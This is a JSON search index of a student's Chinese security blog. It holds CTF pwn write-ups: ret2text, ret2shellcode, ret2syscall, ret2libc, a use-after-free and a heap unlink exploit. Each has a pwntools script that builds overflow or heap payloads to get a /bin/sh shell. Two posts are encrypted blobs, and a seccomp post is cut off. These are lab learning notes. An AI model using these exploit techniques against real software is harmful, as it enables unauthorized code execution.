{"pages":[{"title":"about","text":"[+] BUPT 曾经的博客：https://blog.csdn.net/qq_45834505 一个在自我救赎的shaonian","link":"/about/index.html"}],"posts":[{"title":"To kk","text":"a6d9ea9da8fc05ccc8d1164b3233fcb9f916a25df64cb3eb9e156f870aeb0bace7a5f9a2f31e4e6a093e41d09ae93088a7794afac578f6d3fbf325913a77a67396f06b3501f17e0033fe543b9aded0eaf29b19427dadcf14a3bd154edeb1025e71f80d883df6cc99c13db2ff0b99e4a8d670b33678984bdb4cbe7b93d73b75397d16301dd6d090284e28f68fd66b7940b44586e6b61ada3a52be6956e36ea16799a886611b830f36e71e4f6f880d3e148e94a8124a52a892cd9e96aaa50f3f5a2d6737cb14dc81f031b22e37160307126d61a22ce5917c634cdcea971f35021128725a62ba0522efe0f75eab1a73dd62256c6d794206934dc5cb857aad22b18c5ffeb8f766014fcb338b5546b76c43d6beede45f239066638da4d5c750783357011ed851f23a5144dea8ec45f59b28b089f039cf191654b6ab1fe5a2b6bc874807373f5b8d969ee5e48e147e137a6b8ec9c5e6059bca4e5b23b3927b2115759511dc777cee5778d94cc59503df8b0c8834378c25dc395750a7800090327696319ee815274415ade89ad6382497e718a669f76f667718b299fda380989a6dbb79c50784327e18ad50864d0620818a12f05f553142983fd0a37629c9f173081d7662e59568a8cbcf9fc70b04d20b1471c883d2f08ab5e8ca33d934451d26faa055825d43f3aaefd44c845ec02126ecaf6c6840ac651327d29fb82f3c2fbe4d81094ff5aa1f4aadf703bcecb535767a2cb3793a475fb427baa4e5ff1d981cb8a0bee1cb7391f3665478f0775cd9c47f6277c195108776bf3b76700135e04f6e99bd602f8d20e0c4077d57784832a73460c0f8a11fce9299a43fed8d771497ad9e2a1f563cb700cf437fd28bdf3d240c16f875f3bc7c7c837c503cff10d9815d95800f67a263f91c3710feae8607c4fee42aca4f26c60d5940ecc7b7cf25bdf2a7df40527b4af3e99357ce1fdf7f03c0539fa5eae29268c66219292201c87e1f994ea57752c02ea2ad8ec7789c6fec79ad4dbe25f4d1590b4dd7aeafb73c22c62e15daaaba4498ac2981cd399b11971a3ebcf499872db2f37c87e820630e438463164f17598245369ec9f1913b8580367ff9a430bf9764c358a960815d9a007610e9c1fb88fdadda3e1401fb944e18748fec5e7bd64b2d7c1b12791bb81666c9c9707c8a486a60933241fe309538503fff61e39ed17ccc0ab4b8bc15457355d0405f72284f39c0624dfd07137cdf38e4de199fe8912664b9100a13f9dcdf53d44500ffc7c958ec4e9fd63f6fdc549c29517d012a04d32bf258400039fc2a918c0bbc714deafb19c81cab20afe9c29daf439aeafa9bfef37a8b513fd0799009db2aa0eececec18ea2404f4a05626286069ebcbf341120bf1ab53365426dd7952ccf3822bba3077f31fdb4a02935e7b4c0131a9e98900078b64d01c45391225965a95174b748138bd2c956ea6971ac348099ed1dd584b1428b7a41ae8abd9be599cea39e5576f2c32fbeccc8ae9a98020fc65c32ddb6f7dc9f02d611379cf2a6bebcad8f8a5dd8c2444e1c1a1ab4d2cdf41d61073552c54897c7fd620cb32db4b2cc5c220a166ed91bf288af76067619aeb414c1387015a6e48711bdad48ccb07202dc839f6384a2dc80181ef3fd5768c73e59d45571f3c0d7e7cd3ac158e6f24fc201cf88e6c4281d5c4efd8f062a96b3c84808c199480debce7fc48487b6c0ecacfa4a6912f708bd1a48d48e965880e5f3621a49cdb35aaf62031c62f0e9169be293d90ea7606126102853884cd1fff1e3fa2780a2ec90c26797a2f934f08dc4f16cf894f86c18394ad375de2cf0eba9b418b2169f16014b9385d2a67121fad4e596af10dd9b761575737bdac32af6f38e95dd0db6052d5278e9867a80534433132e29588ea9f4a8368bdb7730d60c6a8478b1bc7d77d4e4064e5e841a64412b3eafc5d539c6038daee0000c701b2374ff2236ff4112582abdb454a4b8e26b13ee488fd4c39a86357f061dfa04fba955d66eae09e3c12676019018ec233fe2dd882a7162b4e6bf3060a114003f588360854e2f29d95d16cc23da26b1440f33282dadc65283dc66d5773f36742cbe4b9db1be4ee51366716d51c0c75da2e2a60f960c0859f672137cc3360ecf7035c2843bb8ca6dffab49d5200f16eff7b49baf1eefe01a12f3ddaa49f76dc72f0e7a95887e912223c62da80087432368ea6320e2ee76c7657adc06006004b4019ddb06e1e93b3418da9eab9a3ee886bfa41d65cf885c3dcf28244017f5f769838383db2900afe3e57b12c1240d6bfd1f1a3128b9cde3613bd2dd31f27623d4667281cd22f6b72ab74b6af754135628cee25982d6efde72e88e12dbf0bcc66de9ea2c50e5b55621d36d55092dd07f6306f7c0eb2a60299a33dd853513e620d8c40396488736ce6957322a4eedd6244bcf7aa9a5a7d9e9956d59f80a471ca4fd0761b9cb53d0b0e2cceccd8f79ea5a1bc67aaf9cd19a35f2c35b7f84e31cf83cd13d22decc384431191c3e2947257fe77a99b1aa0877a5165ef078446b66cb987be8e07e632698bb3ccbdefbc087aabc061474568fe81ebaed57fc438b297b206d27488ab4f936095dd683ac7af62036f223baf842e65d60f3082a4178b075091c28b2e22f3f815f7feafe000cc73131d3c7c8a4947d81f3ea1cb0a6094bb5bef9e914acd3b5e58d0b20a45d3a88960ff5a8c2a055652f14e126840b32a04bbb17e1cee752a9c5d9f4ef24484ebb5bf413eae7b900a6ff06c61e765967c266d8bc535582ab3947b207f6d986867a0a686610134b5121197646e02fe49b1ecad01fa2f3969f84c53b3f20cc8dead48156d7b0f8a8caeadddcab143593fb835f37dd5592a2ddbe Pease input your password","link":"/2022/01/02/To%20kk/"},{"title":"CTF-WIKI-pwn-基本ROP 漏洞复现","text":"基本ROP ret2text首先检查程序的保护机制。 关于各个保护机制的介绍 :https://www.cnblogs.com/Spider-spiders/p/8798628.html 看到只开启了NX保护，即不可在栈上执行代码。 使用IDA查看源码，可以看到这里有一个危险的gets函数 以及这里有一个system函数 所以如果能直接返回到0x804863A，即可执行该函数。 在GDB中对main函数里的gets函数下断点。 可以看到，存储局部变量 s(eax) 位于esp中存储 查看esp和ebp得知 s的地址为0xffffcecc ebp地址为0xffffcf38 两者距离108个字节 所以108+4=112即为返回地址的地址。( 因为没有开启canary，ebp上就是返回地址的值了。) python脚本，我会给出注释 12345from pwn import * sh = process('./ret2text') #本地链接到文件target = 0x804863a #执行system('/bin/sh')函数的地址sh.sendline('A' * 112 + p32(target)) # 112是上面计算出来的s距离返回地址的字节距离sh.interactive() #进行交互 ret2shellcode先检查程序的保护机制 全部关闭，并且通过RELRO 为Partial 部分模式，得知程序存在存在可读可写可执行段。 通过IDA观察得知，这次同样使用不安全的gets输入，并且将输入完的值拷贝至buf2，观察buf2是什么样的一块内存。 buf是一块位于bss段的可读可写可执行段。所以泄露思路为: 将shellcode拷贝至buf2里，然后通过堆栈溢出将函数返回到执行buf2即可。 在gets函数处下断点 得知s地址为0xffffcecc，ebp地址为0xffffcf38 ebp+4即为函数返回地址。 所以0xcf38-0xcecc+4即为s与返回地址之间的字节距离。 写python脚本 12345678910from pwn import *context.binary = 'ret2shellcode' #全局自动设置架构类型与os类型sh=process('./ret2shellcode') #本地连接target=0x804A080#buf2的地址shellcode=asm(shellcraft.sh())#产生以一个最简单的执行system('/bin/sh')的shellcode 并进行汇编print(p32(target))payload=shellcode.ljust(0xcf38-0xcecc+4,'A')+p32(target)sh.sendline(payload)sh.interactive() ret2syscall先检查开启了哪些防护措施 开启了NX保护，所以无法在栈上直接执行代码。 使用IDA查看，仍然是gets函数导致的栈溢出。 使用系统调用来完成漏洞利用。 找到pop eax,ret，以同样的方法找到ebx.ecx.edx 以及int 80h系统调用和bin/sh 接下来要了解payload这样构成的原因，需要知道这三个指令 在堆栈里，我们知道ebp+4的地方为返回地址。这是因为leave 时 esp=ebp+4,ret 将当前esp指向的值作为返回地址跳转并且ESP+4。 所以构造payload为 payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80]) 先用112个A填充，pop_eax_ret为第一个返回地址，然后ESP指向0xb,以此类推。 写出python脚本，之前都解释过 不再注释了。 123456789101112131415from pwn import *sh = process('./rop')context.binary= 'rop'binsh = 0x80be409int_0x80 = 0x8049421pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() ret2libc1给出got表 PLT表 以及libc的相关解释，我觉得写的很清楚 https://blog.csdn.net/Retrovich/article/details/82973086 基本流程仍然相似，先检查保护 只打开了NX 检查是否存在/bin/sh 在IDA中查找system函数 查看到ptl处的system函数 写Python脚本 12345678from pwn import *context.binary = 'ret2libc1'sh = process('./ret2libc1')binsh = 0x8049720system = 0x8048460payload = flat(['A'*112+system+'b'*4+binsh])&quot;&quot;&quot;这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb' 作为虚假的地址，其后参数对应的参数内容。&quot;&quot;&quot;sh.sendline(payload)sh.interactive() ret2libc2这里仍然用相同的流程，唯一不同的是没有直接给出/bin/sh,需要先调用gets函数再利用pop ret调用system函数 直接给出python的脚本，与上一个例子相同，整体不再多赘述 1234567891011121314##!/usr/bin/env pythonfrom pwn import *sh = process('./ret2libc2')gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat( ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])sh.sendline(payload)sh.sendline('/bin/sh')sh.interactive() 我给出了堆栈溢出的ESP指向流程图，顺着思考容易看懂payload ret2libc3 检查安全保护，只开启了NX IDA里查看，仍然是gets函数的堆栈溢出。 但是这里没有给system函数 也没有给定的/bin/sh 所以需要我们从libc中调用system函数 根据这个知识点 写exp,涉及新的东西我仍然全部做注释 12345678910111213141516171819202122232425from pwn import *from LibcSearcher import LibcSearchercontext.binary='ret2libc3'sh = process('./ret2libc3')ret2libc3 = ELF('ret2libc3') #静态加载ELF文件puts_plt = ret2libc3.plt['puts'] #获取指定文件的plt条目libc_start_main_got = ret2libc3.got['__libc_start_main'] #获取指定文件的got条目main = ret2libc3.symbols['_start'] #获取指定文件的函数地址print(&quot;leak main_got addr and return main&quot;)payload = flat(['A'*112,puts_plt,main,libc_start_main_got]) #先使用plts_plt函数打印出main函数的在got表中的真实地址sh.sendlineafter('Can you find it !?',payload)libc_start_main_addr = u32(sh.recv()[0:4]) #获取main函数的真实地址libc = LibcSearcher('__libc_start_main',libc_start_main_addr) #获取libclibcbase = libc_start_main_addr-libc.dump('__libc_start_main') #获取libc基地址system_addr = libcbase+libc.dump('system') #获取system地址binsh_addr = libcbase +libc.dump('str_bin_sh') #获取binsh字符串地址print(&quot;now get shell&quot;)payload = flat(['A'*112,system_addr,'A'*4,binsh_addr]) #这里开头‘A’的数量要具体到堆栈里调试观察，因为main函数开头先将ESP最后一位变为0即16位对齐，再减128.sh.send(payload)sh.interactive()","link":"/2021/11/11/ROP/"},{"title":"Diaries","text":"b6564b1d950e205446a5f2eabbefe8866c8c0c9144c3793e12be10a85944a02b9e5597b8013830aeb659dc6944f615e50212eca39800024b8915041b82abcbb1f909949a21ee7f948380a304a6a59254655a595662ef8de7c696c909b711d997e9eb675e8bea7c522698a91b595b6de3b69dcbba419572cc25b2185a4a82cce8bd2f6db3f7409fc95b7c5a9b3ba1ac7116919da19415da61d6b781aa18086d93dfeed04c4f81b9a2e2ee533e9db825675e10d1531160f7b3158e2e79b3c56ea069083c7c572d4e9e90fbbbd6b6755f7a70e691765c6234e8b30663740995bd9a157bdfd0047e76514ac4f89c7f453194a05a814b282265c9302fc51857f995e4010fae468aedf59cf8d02a50a16638422d7b29eb2774e6b44d3786131dd08f80185b89115c8f44850a75ce5852bcedad8957a1b0793c7e6339de5ee40130b024c91b4ce5b68fde1b79cb8130e8d1546c390bb72ab668236d7007c08912f687c1994a241a60dfa7e5c0c5477559644feb390cef5eb0fb5383caf8b13993502d3d9ce2380d2e346822ff931a3375e72cd568571c387f9762a664ea90900627b038861a1383ed19a29901ad10ae05429ba1e3627bb7ce1d0c993888c4bfb3d12c4bc4d91d3d2da3497f01319094c52d7e17036e025eaf1732e5ba714264ad7454291112b70483a4ba9aaecbc3a47da7d0be3b1f9fd0d18ada0122056aa443c24bf1a5a73d4a23b65a12e607e794c52b775aefb9b6210860e724999715a479b1fb524287d60ef43c1db037f5540d5db1e5fcadeee3ce77964efc9a24cdaf6281eb0004f1db42d5012582719bc20bd20e3a3119cda0e445ff9aa3497882ec0b54d10fdbba87ceb18e9121cde5e0204d21f22b4182bded3784849045161f045a7d3e29d9725e255c8aef501bfca97e461340ae17e09b9a72e3a52701486034861ce509e0d60028276f3b9efbcb9d9cd7872a0f4a6dd320123df8e71bef1436b01bdb843df2f21bc550b2ed8f1109bba2f13c0ee1072f984bf26d3976b1b26fe64801b3355e70a87059b0ee8facd989bcacd7c5fb83e4c88de349dfb664a058440f79e4fab1391efcdcc6312652d7ef3564bcbfd5120eeadbe25d5d35b33167464b2b13a7e9710cfd2d5e5855e37757ab2f664baec6268095abc67e22959e427479dc2c211fb65fc272afa03f0322759dfe52473ae9e6f869d015d1c029ab6fb3173e7b8cac34208c99ef4d3f51031bd48824cfda64bb4ef3d609c4cff7b8188fb69d505483f333e294ff22d532b587daa82e1e459b856cec1c29c8e138f1513993b3905406a5a6294141b755d401b97800f9ed9f0d965c382c900f5781308caf782bb3fca3b656e35e9b8640a9f2e333d25fa705d80cc95eb08cf15f557a5ba057d9a792ba3fb5f0408c273a56363dce042808398ec243da0020f293b2fedcdbcbd31a3f10b5a07d49e049e2eaa043a4232ab1fb86b19784cba2cb9f6d43a3ffd4b9ac58ede0aba3739885cb991f18719daed98bf240e2fa7a8e4406202a933842ab015de8b56c08aea1fe2f3bb8bf8be7fed795b6523bf7f68bac9f0bc81c67683a837f82c5eb599d8c0d6ee09dbf452fd4463cf090537a9a27037c5f0885f5621731c9f10617edd82f73cac28bc86a488559f37ea6d309f552c725851ad3a8018f92512e01aa25730c55a5f3e4bd6dc304a1471a8dd5bada58114dc28dc8788a75881f924e60fde96f56a391e04da341e774dc44442cefd4095c87a9d1a7cec92b023a06d70092a1ee0c7e0fa5adcd4f99fb609d7269e70f38a38b77cec17d0f95f35f0ef480d66046cec5779e57ebcc6d8f84170e4f9e904526c77a20cb964298534f97c85e4ea3590fd5f1d9163a01f318b419acd85d99ec2621bbd7d677773dea589d07813afdd2b2c34a7ec3ff61afab3c7f801369b3bf6ec90a1a5e5b2d3e8da02eebd2608052cc33f66ad223189d46c188fdce88038c526e9bb9dcb69c49ceec8d52ce9de4024f3974e85b618f85fba93b7a1b9f1d6a70e8370a7bb58dad93332a95132bc75705c79b532999c80b394626b905369069da7c6b84cf223108c5ed064d4e4eadf932896211de63e59c415d2420b11bfaa9f52a6ca443f75cab784304085b7287578a3e6cac1665e536962e50bb8b60431c0b55a6ed21fc8bd28af8f93809da8f5a9a66afd96e6f4938b853608e7556cda175b016fe84807d9d784432f0892a1adf49cfcc77f5e791bf0e36ddb3d617089232f5b05ae3dfbd3ff588550946b2ea5e68ba6fbeac953909423df405b4ddcd500268c5d375b20f93bd52eda68fed439160a4da74ed6f62642e8c561b794b96e2564945968b1a7407575f17cd000baf39920122d4de6f7db44d1b43adc9bab8ce4fbf76ee062503e2a5ab3f163f37cb14ca663d00b165155036698ccf3ecf0f77982028aed4a325e11944b53616d8bebc454e15bfb268528164eef976ba761e03e86d8f287056c8df5e4c9e97466409bd629c6c39dd853a5ef04b85eae33d8814f639013a23d78b6244eb57da0fe36c35f6c2779ce5e466a8c1162a2ab2bcb564977d8d19c4bdce5e33d6a6b0ccf3fbe81335f32e9204ac5f97c767aed7865d0556148ad555dab0ea2051490def843fbb82b8d7515016b706e528849a104dc8b5d36bcf54fc1a9dbbbaa85542fd218aa7cbfeb87587d0a9070ccc4c37a87bf6d749ebf2ad4fd7b0323f01e950d7a580877c4c1d58caaf938793a8fbff61dda15ae1a74fd3029845f6a4d7bef781452b981334ecaa509fbe48b2d39a37d1bd57b6d4cf76b7d448fb3549304469317d6d8fe0a0f7c919ca523c8308bb6c4a7d90ef8a18a7ab840aee67ed820da26e59fc9f9dcc5b2a9b92c9bb211a87e2495fc881daeb9100f94c6ce4f255df2d91011aab3b000d74819ed1cd001e9fe1561751c2ccf66e7f98a3f1af11f701870c452d519bad326738f27926f0066a75265555da34051af8270b78343c4b2b2d663b7fcdcf607e9d456daf0ea703e6a81cd6db12a070dae69c18892be87968b0106796c93873cb89aa2e7159eae36f01a19993735f8c12a37fc9036ba3a1c0ab692f34cf1e01bc51fece58ac0fa2a1b1d7f5a8689060f9ee2cf52606c7a0425ba49b32c58e56ae993527e56dca6c3e2a613dd92127974bc3834b4db8ccbed1534105c4cc616dc0e51060183fb41c84acdb0840fb7282e6eca62eef6cdab52d5d5596f0f86bb68dc1c05e0c4f5fc0bcbb73062732eddd21dbc6f0761348410486edeb8e674d88aaeaf3e101067bd42b566f428b542faf424a6e94de15f811b1b0c6c210ae2c08f3ffa21ed084333a3042647c05a9b35018ab6a478eb81794c6573c7db6be3f366e96830567f2bd30f1e2a99019226f2d73b3f18bb069cbee268e2af65f3a1d3ecce08369a77a9057216c25d716748d433fdd2ade782613539684de433df7f04a62c473de759c17c617f3cdf3e71536d5d6c329ece3b7ade8d67cbf93296a31714d439eedf53e5b8ed8a8ededc27ebbd16186b9b28be539508f227525353b10ce4c958ae3d19619a8dee7564f07a84394a14c003734748637a9c5e0bb2c7201ab2fc436546321742494c5e863b74edc4d8dc0d7d5463324729353d9cc3cf9955ee0eddd4d5cac3f7a0149c9165e9c6ff344c1d4675b336adf4544b34a17bae2f418dae9a7eb061666612883b6008ea252184d3dece44f1835ee39dc2781ad52e55c88503e8be7fca7f9e15ec4fd5a3a2b73019e3f1923df5792a10becff6c27adc2e33d01d74c142f626de851d344cc596209ab07203a686863014063d1a6904db8b09de55ba6dc48098927c36216c034fc40821a94c892c47a19a669913a871d704540f6fc3ef46f1e3cb7f0fcd2ed3fb76b80178f9e1788b8dc6276bf315e6a19795700e38db9d0a618e43482c7965215e0ceabb498e844d3c35d5f6c288210c8754a4eed3008862325085249b6d1dfb440afc9a2c930eeb7e2cc5fce27ce6c9ced227ba36e5a7ebe8761a71f4837901167eb81bc96d1f4c033c5a40eaf364cf45c62e241a9bff1d0573202661c2481847f7b7de66630fbd166e8c15523c2316920b0825ab26d81f441045d694bb83686657aad45692fba414620e8824dcbdba9b826edb841c9d9a05b29e42f41bc08d0704e345d5f6ea78d67636c7264ae8524d2584a01cf8bb1f708dfdef36c9c936ad3ef91cda36df96e1450d6defb4bfc8715ab593b2be8933c9b82a00c0b7239729f3d6b3682a74b6f7c9313d164ac8dcbbcdb516536267d9941184e12f7759b741de98c75ddf7fa9d7109e2d89a837cb61e178db8e2fd67999ab6810fd2cd58afa72e112c160d837d9546f9d68118048bdadae867d34491c6103ada4056af2adb142bc5a49ee2c0cdaea7b0c209e60d57d12deef2b236332ea3da05ee7caacecacd9c21a1cf4b21c6a0f5f2274ebbecc8015b5309e1f2e70b9820f619f1f9f6f9bdc74af69f5e76f509ee5ad41a3cc220f849214b0f5e88b1a295f21d301e4ee37adbed0d0ff6f53e27ce46e0d14626b0e28db6ceeb6cb736f6d6cdf6f6573c25b494355ca032dedf466a3511eb572f32a19a0de8b29cb53cab815b8626d25ca62b5c2d04a14fd7acda8cca6609a9dfb94d7085bfd96f63c5590eed89082ce05ff13489facce36c7572d4297a63e4b0b1767856d8f7b82d659bdf174340aa8c33ed7c05dfb6ae3c65883024e935e99e23194838c856655571f9bf7a7124c2b947bf7aa01b7d4a56615ee7f63f6a522b8fa73eff6725d8ce7adc62ae741d8cfa41b71b091fc2e8078aeca6544d3eb623ae12600bceb0275cf86fe45247461bf404457deb370dd02038dafc0e504f084707b30893d324e392100afd51637eba9915374acff9af6b877d3e9e35c678ddf5a5f84198dacf5167ebd6fe318d5714323c52e3885514676d59dc01c36e795c0a6721e6dc0cfd016d5b415322715545cd14f92f544886fb72e4fb9d2167bc1ca4dda40039bdaaeb1fb8ccba3aacdfd4248886329009dd3666e9bfb5931289322c58dc8dbad35807a6c7e3debb1332fed6cf0973d95a8f495d991d12d425d8e669632f8c752e0890b7db4f7cc3ef9c5b8c2534dfa8302fb63fc6c9c16268891bd6e2a20104a989a50492c83e8c1479a5a87fd1c31e68b18e2fda6df537185e6dc82d590d9657b439e9d19cec9994fbbe92a37aed974f6c6caeec7c42af4b8031607ae37cfb3bf79bded3de27982f758c1cbdf62027bf44bdc476256fc2641d549051c91b9dd4ff3cefaf876432a58b1f35bbdb3fe69b4f73c2d40e81b7a12f0a8f26c8608a31467e69c5e4c4f18b529c155d8184ea8c6b9a0401b452f973bdc226a51644d614f63485cc9fa0449949bd1e487d8f89fff2b99e1ae3d1a847e5713713fe52745bf47d548dd24c332b7a37d0237aec1e068500f5416bbfb91137fa5f86d52b15417dbdfa25e6f2cfd66b66f5822adaf4315f37eea521bd97e6d0e4b5ea222770adcef9b98abadf6cb17248d98c44e6d32bc95dad0bd3b4f9d766cbd38a4e58cd1244b2368a0a7ce5ce4a13bf49ab86f6b5f4bf17ad00f3d66904dc46da44c7469aeaf28a5a3f33a29cde9d9ff4c578a83ad322d3e67ccff8a92cec2f5260333ab8e3d2fac8f197b0e39c7f51424eb08beb30606a3a29f497e4f68e03670858dfa7b2531a369eb1d43e49821f6a554a791de9bd85dcea6f227bdc4c881e195656269de8727b8b472ca90354ee2b21b3147c20552a626d55d68f74018810d2dd0e239e63f792960d7b764e8f96240b8efdb1077f11f5e8c44335583a97d61bbb78366c720875c4cfcd7ac477caec44ad60d626c4d844bb638da9fce3fc452cbf51849d9a259ebcd0a79569a1c2dc7a5347284b94a3fb4c0882be008f3a24ab126386641b7d31ae6e973228c76aa76b59bf0b91135a8d7ef3b1bd74e9bc913bc2693fe254e53026257022dfae04b231959c8e5631c34cd0276a159780faaaa45da90f04470926c4cbf9ea91f6ccd27f455b8896e12c000062463bb179d8d6babd69c41bc8a9f9d61a8fbc4e51a2f0b2a544bd515de993576f0fee779c21dc583339bf6479f212c7f7e13cfb1aecf11e7814b407a876ef4fc1b82d9a38191849125f82cad312e91f95bacff296fcbd2d2b94dadfdf9af8d9a58fd34b33065e1308c2e114fd2366e71ad3d9212f91a6365a21fe7678b7aa7a202deb792cb0c19717c50ecb41d034dc2fa3bfbf412ec875c65d7e508cf68b5fde0a9f6927c118daf82c6ed56e1da98a40333b9a9b8df340e3e6752d6b Pease input your password","link":"/2021/12/26/diary/"},{"title":"堆漏洞uaf","text":"uaf 知识点UAF漏洞全称为use after free，即释放后重用。漏洞产生的原因，在于内存在被释放后，但是指向指针并没有被删除，又被程序调用。比较常见的类型是C++对象，利用UAF修改C++的虚函数表导致的任意代码执行。 例题[BUUCTF]PWN——hitcontraining_uaf checksec检查，开了NX保护，32位 (1) add note add会申请两次内存,第一次申请8个字节,前四个字节指向print_note_content这个函数, 后四个字节指向我们写入的字符串(count会加1) (2) delete note 只释放了堆块里的内容但没有将指针置0，存在uaf漏洞，并未指向NULL (3) print note 调用add申请的第一个8个字节中的前四个字节指向的函数,打印add创建的第二个chunk里的值 （4） shell fastbin是单向链表遵循先进后出原则，申请A,B两个堆块后，先释放A ，后释放B，会在fastbin里形成链,此时，再次申请一个大小为0x8的内存C，并写入shellcode地址，那么第一个8个字节C就指向B，第二个8个字节C指向A，这时候我们写入的内容就会覆盖原有的，但原来的指针仍指向它，因而可以更改print_note_content函数为我们想要执行的函数。 在add中，我们只能对content部分进行操作，无法对print_note_content对应的部分即put段进行操作，所以我们要想办法，操作put段 1根据put段和content段中大小的不同，如果要申请到put段，payload大小应该为0x8，由于先进后出原则，先释放A，后释放B，此时第三次申请的put段指向B的put，content段指向A的put，content写入magic，调用print_note(0)时就调用了magic 申请过程堆块变化：add: free后： 再次申请，写入shell 先进后出原则 wp: 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *r = process('./hacknote')# r = remote('node4.buuoj.cn',27609)shell_add = 0x8048945def add(size,content): r.sendlineafter('choice :','1') r.sendlineafter('Note size :',str(size)) r.sendlineafter('Content :',content)def delete(idx): r.sendlineafter('choice :','2') r.sendlineafter('Index :',str(idx))def printf(idx): r.sendlineafter('choice :','3') r.sendlineafter('Index :',str(idx))add(48,'aaaa')add(48,'bbbb')#gdb.attach(r)delete(0)delete(1)add(8,p32(shell_add))printf(0)#第二种思路double free#add(8,'aaaa')#delete(0)#delete(0)#add(40,'aaaa')#add(8,p32(shell_addr))#printf(1)r.interactive() 参考文章https://blog.csdn.net/mcmuyanga/article/details/108454183?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163714805316780261940769%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163714805316780261940769&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108454183.first_rank_v2_pc_rank_v29&amp;utm_term=hitcontraining_uaf&amp;spm=1018.2226.3001.4187 IE漏洞学习笔记（二）：UAF释放后重用 One_gadget和UAF结合利用堆溢出漏洞研究","link":"/2021/11/17/hitcontraining_uaf/"},{"title":"jarvisoj_level6_x64","text":"double free，unlink覆写got表 Jarvisoj_level6_x64程序分析主函数： 之后 sub_400A49：用户初始堆分配 sub_400998：要求输入一个操作选项 sub_400B14：遍历索引打印所有标号和记录内容 sub_400BC2: 要求输入记录的内容长度和记录内容，然后检测输入长度是否超过最大值，正常则malloc一个堆块用来存储记录，然后按输入的长度读取记录内容到堆块： sub_400D87：编辑，是一个realloc，可以泄露堆溢出 堆v2也就是size进行了要求，在最后的sub_40085D函数中进行了内容读取，这里没有将字符串结束符读进来因此可以进行内存泄露，泄露偏移和system地址。 sub_400f7d：删除功能，依据标号找到相应的记录然后重置索引表为未使用态并free掉堆块，存在double free漏洞 unlink思路 利用unsorted bin的fd指针分别泄露出heap地址和libc地址，这样就得到了最初那个0x1820大小的chunk的地址 利用realloc功能来构造unlink条件，结合uaf漏洞，修改某个ptr为ptr - 0x18，这个ptr在0x1820堆块上 利用edit修改atoi@got为system地址 输入/bin/sh拿shell 漏洞利用添加四个Note，释放note[0]和note[2]，此时note[0]的bk指向note[2]的chunk，note[2]的bk指向main_arena+0x58（两个chunk都进入unsorted bin）再次添加2个note，payload长度为8，注意结尾不要是\\x00利用list泄露NOTE管理块的地址和libc基地址将四个note全部删除添加一个note，长度要能包含进最开始的3个note的chunk伪造一个chunk，大小为0x80，fd为note[0]-0x18， bk为note[0]-0x10，利用unlink把NOTE管理块中note[0]的地址改为note[0]-0x18把note[0]改为atoi的got，然后编辑note[0]，改为system地址输入/bin/sh，获取shell 先申请4个chunk，然后free(0)和free(2)，防止合并；然后在申请2个chunk，只写入8字节，就可以leak出heap和libc的基地址;在heap基地址偏移0x30的地方有我们需要的NOTE管理块的地址 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p=process('./freenote_x64')# p=remote('node4.buuoj.cn',28735)libc=ELF('libc-2.23.so')e=ELF('./freenote_x64')def List(): p.recvuntil('Your choice: ') p.sendline('1')def new(cont): p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('Length of new note: ') p.sendline(str(len(cont))) p.recvuntil('Enter your note: ') p.sendline(cont)def edit(num,cont): p.recvuntil('Your choice: ') p.sendline('3') p.recvuntil('Note number: ') p.sendline(str(num)) p.recvuntil('Length of note: ') p.sendline(str(len(cont))) p.recvuntil('Enter your note: ') p.sendline(cont)def delete(num): p.recvuntil('Your choice: ') p.sendline('4') p.recvuntil('Note number: ') p.sendline(str(num))new('a'*0x80)new('b'*0x80)new('c'*0x80)new('d'*0x80)delete(0)delete(2)new('11111111')new('22222222')List()p.recvuntil('11111111')s=p.recvuntil('\\x0a')chunk2=u64(s[:-1].ljust(8,'\\x00'))heap_addr=chunk2-0x1940point_chunk0=heap_addr+0x30print hex(heap_addr)delete(1)delete(2)delete(3)#unlinkpayload = p64(0x90)+p64(0x81)+p64(point_chunk0-0x18)+p64(point_chunk0-0x10) payload +='a'*0x60payload += p64(0x80)+p64(0x90)payload +='c'*0x80+p64(0x90)+p64(0x121)edit(0,payload)delete(1)#free_got-&gt;systemfree_got_addr=e.got['free']print hex(free_got_addr)payload2=p64(4)+p64(1)+p64(0x8)+p64(free_got_addr)payload2+=p64(1)+p64(0x8)+p64(chunk2)payload2+=p64(1)+p64(0x8)+p64(e.got['atoi'])payload2+='\\x00'*(0x120-80)edit(0,payload2)p.recvuntil('Your choice: Invalid!\\n')List()p.recvuntil('2. ')atoi_in_server=u64(p.recvuntil('\\x0a')[:-1].ljust(8,'\\x00'))system_in_server=libc.symbols['system']+atoi_in_server-libc.symbols['atoi']#gdb.attach(proc.pidof(p)[0])payload3=p64(system_in_server)edit(0,payload3)edit(1,&quot;/bin/sh\\x00&quot;)delete(1)p.interactive() 参考文章https://blog.csdn.net/weixin_45427676/article/details/105495608 https://www.cnblogs.com/LynneHuan/p/14869403.html","link":"/2022/01/13/jarvisoj_level6_x64/"},{"title":"pwnable orw","text":"prctl内核沙箱机制 知识点prctl seccomp相当于内核中的一种安全机制，正常情况下，程序可以使用所有的syscall，但是当劫持程序流程之后通过exeve来呼叫syscall得到shell时过滤掉某些syscall，只允许使用部分syscall。 seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system 